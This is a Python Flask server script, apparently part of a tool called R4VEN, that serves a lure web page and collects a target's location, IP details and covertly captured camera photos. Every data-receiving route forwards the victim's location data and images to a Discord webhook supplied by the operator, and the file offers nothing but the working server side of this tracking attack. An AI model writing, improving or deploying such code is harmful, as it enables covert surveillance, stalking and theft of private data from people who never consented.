#!/usr/bin/env python3
import os
import sys
from flask import Flask, request, jsonify, Response
from utils import get_file_data, update_webhook
import time
import requests
import argparse

parser = argparse.ArgumentParser(description="R4VEN - Track device location, IP address, and capture a photo with device details.")
parser.add_argument("-t", "--target", help="the target url to send the captured images to", default="http://localhost:8000/image")
parser.add_argument("-p", "--port", help="port to listen on", default=8000, type=int)
parser.add_argument("-w", "--webhook", help="Discord webhook URL", required=True)
args = parser.parse_args()

if not os.path.exists('image'):
    print(f"Creating image directory at {os.getcwd()}/image")
    os.mkdir('image')
PATH_TO_IMAGES_DIR = os.path.join(os.getcwd(), 'image')

DISCORD_WEBHOOK_FILE_NAME = "dwebhook.js"
HTML_FILE_NAME = "index.html"
app = Flask(__name__)

@app.route("/", methods=["GET"])
def get_website():
    try:
        html_data = get_file_data(HTML_FILE_NAME)
        return Response(html_data, content_type="text/html")
    except FileNotFoundError:
        return "HTML file not found", 404

@app.route("/location_update", methods=["POST"])
def update_location():
    data = request.json
    update_webhook(args.webhook, data)
    return "OK"

@app.route('/image', methods=['POST'])
def image():
    img_file = request.files['image']
    filename = ('%s.jpeg' % time.strftime("%Y%m%d-%H%M%S"))
    img_file.save('%s/%s' % (PATH_TO_IMAGES_DIR, filename))
    print(f"Picture of the target captured and saved as {filename}")

    # Send the image to the Discord webhook
    files = {'image': open(f'{PATH_TO_IMAGES_DIR}/{filename}', 'rb')}
    requests.post(args.webhook, files=files)
    return Response(f"{filename} saved and sent to Discord webhook")

@app.route('/get_target', methods=['GET'])
def get_url():
    return args.target

def main():
    print(f"Server running on port {args.port}")
    app.run(debug=False, host="0.0.0.0", port=args.port)

if __name__ == "__main__":
    main()